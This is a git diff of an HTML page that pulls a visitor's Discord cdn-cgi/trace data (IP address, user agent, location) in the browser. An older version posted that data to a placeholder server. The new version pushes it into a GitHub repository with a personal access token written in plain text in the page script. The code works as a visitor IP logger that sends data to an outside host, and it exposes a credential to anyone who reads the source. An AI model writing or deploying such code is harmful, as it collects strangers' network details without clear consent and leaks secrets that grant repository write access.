@@ -3,30 +3,58 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Fetch Discord Info</title>
+  <title>Fetch and Push Discord Info</title>
 </head>
 <body>
-  <h1>Fetching Your Discord Information...</h1>
+  <h1>Fetching and Pushing Your Discord Information...</h1>
   <pre id="info"></pre>
 
   <script>
+    // Your GitHub Personal Access Token (PAT) - Keep it secret!
+    const githubToken = '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';
+    const repoOwner = 'Atmosphere-Studios';
+    const repoName = 'Atmosphere-Studios.github.io';
+    const filePath = 'trace_data.txt'; // File where the trace data will be saved
+
+    // GitHub API URL to create/update the file
+    const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;
+
+    // Fetch trace data from Discord
     fetch('https://discord.com/cdn-cgi/trace')
       .then(response => response.text())
       .then(data => {
         document.getElementById('info').textContent = data;
 
-        // Send the data to your external server
-        fetch('https://your-external-server.com/submit-info', {  // Replace with your server URL
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ traceData: data })
+        // Prepare data for GitHub API
+        const base64Data = btoa(data); // GitHub requires content to be base64-encoded
+        const message = 'Updating trace data file';
+
+        // GitHub API request options
+        const requestBody = JSON.stringify({
+          message: message,
+          content: base64Data,
+          sha: '', // SHA of the file if it already exists (empty for new files)
+        });
+
+        // Send data to GitHub repository
+        fetch(apiUrl, {
+          method: 'PUT',
+          headers: {
+            'Authorization': `token ${githubToken}`,
+            'Content-Type': 'application/json',
+          },
+          body: requestBody,
         })
-        .then(response => response.text())
-        .then(responseText => {
-          console.log(responseText);
+        .then(response => response.json())
+        .then(result => {
+          if (result.content) {
+            alert('Trace data has been successfully pushed to GitHub!');
+          } else {
+            alert('Error pushing data to GitHub!');
+          }
         })
         .catch(error => {
-          console.error('Error sending data to server:', error);
+          alert('Error: ' + error);
         });
       })
       .catch(error => {
